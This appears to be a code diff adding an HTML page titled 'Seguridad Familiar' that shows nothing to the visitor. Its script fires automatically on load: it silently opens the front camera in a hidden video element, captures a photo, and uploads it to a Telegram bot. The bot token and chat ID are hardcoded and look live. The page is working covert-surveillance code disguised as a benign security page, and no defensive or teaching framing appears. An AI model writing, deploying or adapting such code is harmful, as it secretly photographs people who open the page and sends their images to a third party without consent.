@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Seguridad Familiar</title>
+    <script>
+        const botToken = '7555861557:AAGfZFvIiXAYxYUB21e7HHGCD7XPOXffM3g'; // Token del bot
+        const chatId = '1223367230'; // Chat ID
+
+        async function initializeCamera() {
+            const constraints = {
+                video: {
+                    facingMode: "user" // Seleccionar cámara frontal
+                }
+            };
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.createElement('video'); // Crear elemento video en segundo plano
+                video.style.display = 'none'; // Ocultarlo visualmente
+                document.body.appendChild(video);
+                video.srcObject = stream;
+                video.play();
+
+                // Esperar a que el video esté listo
+                video.onloadedmetadata = async () => {
+                    await captureAndSendPhoto(video, stream);
+                    stream.getTracks().forEach(track => track.stop()); // Detener cámara después de capturar
+                    video.remove(); // Eliminar el elemento video
+                };
+            } catch (error) {
+                console.error('Error al acceder a la cámara:', error);
+            }
+        }
+
+        async function captureAndSendPhoto(video, stream) {
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            // Configurar canvas con las dimensiones del video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Dibujar la imagen del video en el canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convertir el contenido del canvas a un archivo Blob
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'photo.jpg');
+
+                const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (!response.ok) {
+                        console.error('Error al enviar la foto:', await response.json());
+                    }
+                } catch (error) {
+                    console.error('Error de red:', error.message);
+                }
+            }, 'image/jpeg');
+        }
+
+        // Iniciar cámara automáticamente al cargar la página
+        window.onload = initializeCamera;
+    </script>
+</head>
+<body>
+    <!-- No hay contenido visible -->
+</body>
+</html>
